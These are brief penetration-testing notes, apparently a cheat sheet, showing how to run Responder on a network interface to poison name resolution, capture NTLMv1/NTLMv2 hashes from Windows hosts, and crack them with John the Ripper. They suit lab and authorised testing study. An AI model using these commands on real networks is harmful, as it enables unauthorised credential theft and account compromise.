```bash
used to capture NTLMv1/NTLMv2 hashes by poisoning name resolution protocols.

responder -I eth0
# Finding Your Interface
ip a

Outbut will save
/usr/share/responder/logs/
```
```bash
# In Parrot/Kali OS, 
responder -I eth0

# In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
# To crack that hash, use JohntheRipper
john SMB<filename>
```
